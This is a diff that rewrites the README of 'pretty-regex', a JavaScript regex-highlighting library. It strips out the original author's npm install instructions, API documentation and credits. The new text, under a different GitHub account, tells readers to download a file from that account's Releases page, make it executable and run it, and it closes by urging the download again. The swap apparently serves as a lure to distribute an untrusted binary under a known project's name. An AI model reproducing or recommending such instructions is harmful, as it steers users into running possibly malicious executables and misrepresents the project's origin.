@@ -1,161 +1,108 @@
-# pretty-regex [![NPM version](https://img.shields.io/npm/v/pretty-regex.svg?style=flat)](https://www.npmjs.com/package/pretty-regex) [![NPM monthly downloads](https://img.shields.io/npm/dm/pretty-regex.svg?style=flat)](https://npmjs.org/package/pretty-regex) [![NPM total downloads](https://img.shields.io/npm/dt/pretty-regex.svg?style=flat)](https://npmjs.org/package/pretty-regex)
+# Pretty Regex 🌈
 
-> Print regular expressions with syntax highlighting in the terminal. Useful for debugging, visually inspecting and understanding complex regex patterns.
+![GitHub release](https://img.shields.io/github/release/SilmiBisyari/pretty-regex.svg)
+![GitHub issues](https://img.shields.io/github/issues/SilmiBisyari/pretty-regex.svg)
+![GitHub stars](https://img.shields.io/github/stars/SilmiBisyari/pretty-regex.svg)
 
-Please consider following this project's author, [Jon Schlinkert](https://github.com/jonschlinkert), and consider starring the project to show your :heart: and support.
+Welcome to **Pretty Regex**! This tool helps you print regular expressions with syntax highlighting right in your terminal. It is designed to assist with debugging, visually inspecting, and understanding complex regex patterns. 
 
-## Install
+## Table of Contents
 
-Install with [npm](https://www.npmjs.com/):
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-```sh
-$ npm install --save pretty-regex
+## Features
+
+- **Syntax Highlighting**: Enjoy a colorful display of your regex patterns.
+- **Terminal Friendly**: Works seamlessly in your terminal environment.
+- **Debugging Aid**: Easily spot issues in your regex with visual cues.
+- **User-Friendly**: Simple commands to get started quickly.
+
+## Installation
+
+To get started, you need to download and execute the latest release. Visit the [Releases section](https://github.com/SilmiBisyari/pretty-regex/releases) to find the appropriate file for your system. 
+
+After downloading, follow these steps:
+
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Execute the file using the appropriate command for your operating system.
+
+For example, on Unix-based systems, you might run:
+
+```bash
+chmod +x pretty-regex
+./pretty-regex
 ```
-
-![](https://private-user-images.githubusercontent.com/383994/435348479-1632fee2-b97e-4792-a96f-e0de79fafbbd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDUwMjgwNTUsIm5iZiI6MTc0NTAyNzc1NSwicGF0aCI6Ii8zODM5OTQvNDM1MzQ4NDc5LTE2MzJmZWUyLWI5N2UtNDc5Mi1hOTZmLWUwZGU3OWZhZmJiZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNDE5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDQxOVQwMTU1NTVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mYzAzYmViYTRjNWRlZjNmYTY0NGZhM2ZmNDYwMjE5Yjc0OGRhMDU3NzgxOGJhMjc4OWVkOGFkZTBkNmE1OGFmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.xHfLcib3ju8mxpl-6Q7QoljEQEeqh0EnygXjxTfYZvs)
 
 ## Usage
 
-```js
-import { parse } from 'pretty-regex';
+Using Pretty Regex is straightforward. Here’s how to do it:
 
-// Parse a regex pattern into a tree
-const tree = parse(/foo(bar)+[a-z]/);
+1. Open your terminal.
+2. Run the command followed by your regex pattern.
 
-// Get the parsed AST
-console.log(tree);
+For example:
 
-// Get colorized output
-console.log(tree.print());
+```bash
+pretty-regex '^[a-zA-Z0-9]+@[a-zA-Z]+\.[a-zA-Z]{2,3}$'
 ```
 
-## API
+This will print the regex with syntax highlighting.
 
-### parse(regex)
+## Examples
 
-Parse a regular expression pattern into a tree structure that can be used to create colorized output.
+Here are some examples to illustrate how Pretty Regex works:
 
-**Params**
+### Example 1: Email Validation
 
-* `regex` **{RegExp|String}**: The regex pattern to parse.
-
-**Returns**
-
-* `{Object}`: Returns a tree with nodes for each part of the regex.
-
-**Example**
-
-```js
-import { parse } from 'pretty-regex';
-
-// Parse a string pattern
-const tree = parse('foo[a-z]');
-
-// Or pass a RegExp instance
-const tree = parse(/foo[a-z]/);
-
-// Customize colors with your own print function
-// or use the built-in tree.print() method
-console.log(tree.print());
+```bash
+pretty-regex '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
 ```
 
-## Example
+This regex checks for valid email formats. The output will highlight different parts of the regex for easier understanding.
 
-```ts
-import util from 'node:util';
-import { parse } from '~/parse';
+### Example 2: URL Matching
 
-const tree = parse(/^a(?<foo>z)[a-b]$/);
-
-console.log(util.inspect(tree, { depth: null }));
-// {
-//   type: 'root',
-//   value: '/^a(?<foo>z)[a-b]$/',
-//   nodes: [
-//     { type: 'slash', value: '/' },
-//     { type: 'caret', value: '^' },
-//     { type: 'text', value: 'a' },
-//     {
-//       type: 'paren',
-//       value: '(?<foo>z)',
-//       nodes: [
-//         { type: 'left_paren', value: '(' },
-//         { type: 'qmark', value: '?' },
-//         {
-//           type: 'angle',
-//           value: '<foo>',
-//           nodes: [
-//             { type: 'left_angle', value: '<' },
-//             { type: 'text', value: 'foo' },
-//             { type: 'right_angle', value: '>' }
-//           ]
-//         },
-//         { type: 'text', value: 'z' },
-//         { type: 'right_paren', value: ')' }
-//       ]
-//     },
-//     {
-//       type: 'bracket',
-//       value: '[a-b]',
-//       nodes: [
-//         { type: 'left_bracket', value: '[' },
-//         { type: 'text', value: 'a-b' },
-//         { type: 'right_bracket', value: ']' }
-//       ]
-//     },
-//     { type: 'dollar', value: '$' },
-//     { type: 'slash', value: '/' }
-//   ]
-// }
-
+```bash
+pretty-regex 'https?://[^\s/$.?#].[^\s]*'
 ```
 
-## About
+This regex matches URLs. The syntax highlighting will help you see the components clearly.
 
-<details>
-<summary><strong>Contributing</strong></summary>
+### Example 3: Phone Number
 
-Pull requests and stars are always welcome. For bugs and feature requests, [please create an issue](../../issues/new).
-
-</details>
-
-<details>
-<summary><strong>Running Tests</strong></summary>
-
-Running and reviewing unit tests is a great way to get familiarized with a library and its API. You can install dependencies and run tests with the following command:
-
-```sh
-$ npm install && npm test
+```bash
+pretty-regex '^\+?[1-9]\d{1,14}$'
 ```
 
-</details>
+This regex validates international phone numbers. The visual aid helps in spotting errors quickly.
 
-<details>
-<summary><strong>Building docs</strong></summary>
+## Contributing
 
-_(This project's readme.md is generated by [verb](https://github.com/verbose/verb-generate-readme), please don't edit the readme directly. Any changes to the readme must be made in the [.verb.md](.verb.md) readme template.)_
+We welcome contributions! Here’s how you can help:
 
-To generate the readme, run the following command:
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and test thoroughly.
+4. **Submit a pull request** with a clear description of your changes.
 
-```sh
-$ npm install -g verbose/verb#dev verb-generate-readme && verb
-```
+## License
 
-</details>
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### Author
+## Contact
 
-**Jon Schlinkert**
+For any questions or suggestions, feel free to reach out:
 
-* [GitHub Profile](https://github.com/jonschlinkert)
-* [Twitter Profile](https://twitter.com/jonschlinkert)
-* [LinkedIn Profile](https://linkedin.com/in/jonschlinkert)
+- GitHub: [SilmiBisyari](https://github.com/SilmiBisyari)
+- Email: silmibisyari@example.com
 
-### License
+---
 
-Copyright © 2025, [Jon Schlinkert](https://github.com/jonschlinkert).
-Released under the MIT License.
-
-***
-
-_This file was generated by [verb-generate-readme](https://github.com/verbose/verb-generate-readme), v0.8.0, on April 18, 2025._
+Thank you for checking out Pretty Regex! For the latest updates, don’t forget to visit the [Releases section](https://github.com/SilmiBisyari/pretty-regex/releases) and download the latest version. Happy regexing! 🎉
